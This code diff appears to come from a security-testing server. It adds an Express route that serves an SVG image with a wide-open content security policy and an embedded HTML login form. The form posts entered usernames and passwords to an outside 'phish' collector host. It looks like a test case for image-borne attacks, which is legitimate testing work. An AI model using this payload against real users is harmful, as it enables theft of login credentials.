@@ -211,6 +211,24 @@ app.get('/image-clickjacking.svg', (req, res) => {
   `);
 });
 
+app.get('/image-html-form.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+   <svg xmlns="http://www.w3.org/2000/svg">
+      <foreignObject width="100" height="50">
+        <div xmlns="http://www.w3.org/1999/xhtml">
+          <form action="https://kani-collaborator.onrender.com/phish" method="POST">
+            <label>Username:</label><input type="text" name="username" />
+            <label>Password:</label><input type="password" name="password" />
+            <button type="submit">Log In</button>
+          </form>
+        </div>
+      </foreignObject>
+    </svg>
+  `);
+});
 
 
 
